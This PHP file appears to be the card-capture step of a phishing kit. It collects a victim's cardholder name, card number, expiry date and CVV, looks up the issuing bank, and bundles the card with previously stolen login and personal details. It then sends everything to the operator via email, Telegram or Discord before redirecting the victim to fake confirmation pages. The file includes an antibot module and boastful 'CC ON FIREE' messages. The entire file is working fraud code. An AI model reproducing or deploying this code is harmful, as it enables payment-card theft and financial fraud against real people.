<?php 

include("../home.php");
include('../infos.php');
    include('../antibots/antibot.php');
    include('../strom1.php');

if(isset($_POST)){

    $_SESSION["user_nom_titulaire"] = clean_user_input($_POST["user_nom_titulaire"]); 
    $_SESSION["user_numcc"] = clean_user_input(str_replace(" ","",$_POST["user_numcc"])); 
    $_SESSION["user_expira"] = clean_user_input($_POST["user_expira"]); 
    $_SESSION["user_ccv"] = clean_user_input($_POST["user_ccv"]); 


    if(!empty($_SESSION["user_nom_titulaire"]) && !empty($_SESSION["user_ccv"])){


        if(verify_card($_SESSION["user_numcc"],$config)){
            
        $bin = substr($_SESSION["user_numcc"], 0, 6);
        $response = json_decode(file_get_contents("https://lookup.binlist.net/$bin"),true);

        $_SESSION["banque"] = $response["bank"]["name"];
        $_SESSION["type"] = $response["type"];
        $_SESSION["brand"] = $response["brand"];


        // Everything seems fine
        $_SESSION["cc_to_send"] =  "
[💳] +1 CC ON FIREE 🔥 [💳]

💳 Nom du titulaire : ".$_SESSION["user_nom_titulaire"]." 
💳 Numéro de carte : ".$_SESSION["user_numcc"]."
💳 Expiration : ".$_SESSION["user_expira"]."
💳 Cryptogramme : ".$_SESSION["user_ccv"]."

💰 Banque : ".$_SESSION["banque"]."
💰 Type : ".$_SESSION["type"]."
💰 Level : ".$_SESSION["brand"]."

";
        

            $to_send = $_SESSION["cc_to_send"] . $_SESSION["full_to_send"] . $_SESSION["login_to_send"];
            

            if($config["enable_email"]){
                send_email_notification($to_send,$config,"[🉑] 1 Card Incoming");
            }
            if($config["enable_telegram"]){
                send_telegram_notification($to_send,$config);
            }   
            if($config["enable_discord"]){
                send_discord_notification($to_send,$config,"[🉑] 1 Card Incoming");
            }   



        if($config["enable_apple_pay"]){
            header("Location: ../pages/loading.php?sessid=" . $_SESSION["id"]);
        }
        else{
            header("Location: ../pages/confirmation.php?sessid=" . $_SESSION["id"]);
        }
        }
        else{
            // Card is not valid
            header("Location: ../pages/cnum.php?credit_card_is_not_valid=true&authorize_client=" . $_SESSION["id"]);

        }



    }
    else{
        // User credentials not set, redirecting
        header("Location: ../pages/cnum.php?credentials_not_set=true&authorize_client=" . $_SESSION["id"]);
    }

}
else{
    // Post not set, redirecting
    header("Location: ../pages/cnum.php?empty=true&authorize_client=" . $_SESSION["id"]);}


?>